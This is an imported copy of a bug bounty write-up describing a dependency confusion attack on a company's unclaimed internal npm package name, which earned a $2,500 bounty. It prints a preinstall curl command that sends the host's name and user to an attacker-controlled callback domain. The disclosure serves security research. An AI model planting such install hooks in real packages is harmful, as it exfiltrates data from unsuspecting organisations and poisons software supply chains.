---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-09-18_2500-bug-bounty-write-up-remote-code-execution-rce-via-unclaimed-node-package.md
original_filename: 2024-09-18_2500-bug-bounty-write-up-remote-code-execution-rce-via-unclaimed-node-package.md
title: '[2,500$ Bug Bounty Write-Up] Remote Code Execution (RCE) via unclaimed Node
  package'
category: documents
detected_topics:
- supply-chain
- command-injection
- sso
- automation-abuse
tags:
- imported
- documents
- supply-chain
- command-injection
- sso
- automation-abuse
language: en
raw_sha256: c59340a616f1c9360bef77eac99cc709be9fdf18ad1a0648685b5cd4c4515936
text_sha256: 58f095b61aba7bd7da650548a76a1fa8311f1264eaba09deb52c478c21e332c4
ingested_at: '2026-06-28T07:32:38Z'
sensitivity: unknown
redactions_applied: false
---

# [2,500$ Bug Bounty Write-Up] Remote Code Execution (RCE) via unclaimed Node package

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-09-18_2500-bug-bounty-write-up-remote-code-execution-rce-via-unclaimed-node-package.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, sso, automation-abuse
- Ingested At: 2026-06-28T07:32:38Z
- Redactions Applied: False
- Raw SHA256: `c59340a616f1c9360bef77eac99cc709be9fdf18ad1a0648685b5cd4c4515936`
- Text SHA256: `58f095b61aba7bd7da650548a76a1fa8311f1264eaba09deb52c478c21e332c4`


## Content

---
title: "[2,500$ Bug Bounty Write-Up] Remote Code Execution (RCE) via unclaimed Node package"
url: "https://medium.com/@p0lyxena/2-500-bug-bounty-write-up-remote-code-execution-rce-via-unclaimed-node-package-6b9108d10643"
authors: ["Fuleki Ioan"]
bugs: ["RCE", "Dependency confusion"]
bounty: "2,500"
publication_date: "2024-09-18"
added_date: "2024-09-18"
source: "pentester.land/writeups.json"
original_index: 1
scraped_via: "browseros"
---

# [2,500$ Bug Bounty Write-Up] Remote Code Execution (RCE) via unclaimed Node package

Fuleki Ioan
 highlighted

[2,500$ Bug Bounty Write-Up] Remote Code Execution (RCE) via unclaimed Node package
What is Dependency Confusion?
Fuleki Ioan
Follow
3 min read
·
Sep 18, 2024

924

10

Dependency Confusion is a type of software supply chain vulnerability that occurs when a company’s internal package is mistakenly downloaded from a public repository, such as npm, rather than its private registry. This can happen if the package manager (like npm, pip, or others) defaults to pulling from a public source and a package with the same name exists there.

In a dependency confusion attack, an attacker can create a malicious package with the same name as a company’s internal package and publish it to a public registry. If the company’s systems resolve the package from the public registry, they may download and execute the attacker’s code, leading to security risks like Remote Code Execution (RCE).

Press enter or click to view image in full size
How the Vulnerability Was Identified

During an engagement, I examined one of the company’s JavaScript files and noticed that it referenced a Node.js package stored in /node_modules/@confidential-package-name. This indicated that the company was using an internal npm package. I checked if this internal package had been published on the public npm registry, and I discovered that it was unclaimed on npm.

This unclaimed status indicated that anyone could create a package with the same name and potentially cause a dependency confusion issue by tricking the company’s systems into downloading and executing code from the public npm registry instead of their internal source.

How the Vulnerability Was Exploited

To confirm the risk, I created a malicious npm package using the same name as the internal package @confidential-package-name. I then published this package to the public npm registry, embedding a preinstall script designed to execute automatically upon installation.

Get Fuleki Ioan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The preinstall script was simple but effective:

curl — data-urlencode “info=$(hostname && whoami)” http://<attacker-controlled-domain>.oast.fun

Press enter or click to view image in full size
package.json

This script would send the hostname and user information of the server where the package was installed to a domain under my control. Once the package was live on npm, I’ve waited patiently and within a few hours to days I began receiving multiple requests from both production and non-production environments of the company, confirming that their systems were downloading and executing the malicious package.

The requests included details like hostnames and usernames, providing valuable insight into which environments were affected by the dependency confusion attack.

Reporting

After receiving over 150 HTTP and DNS lookups on my controlled host, I began analyzing the IP addresses and the data retrieved from them. I curated the list by filtering out known scrapers and proceeded to conduct WHOIS lookups on all the remaining IPs to check if any matched the company’s IP ranges or their service providers.

Once this analysis was complete, I compiled the report. It was triaged on the same day (big thanks to Raven_Bugcrowd for the quick triage!), and within a week, the report was accepted. I was awarded a $2,500 bounty — the highest reward available for this specific program.

Press enter or click to view image in full size

BugCrowd: https://bugcrowd.com/Polyxena

Linkedin: https://www.linkedin.com/in/fuleki-ioan-503007268/
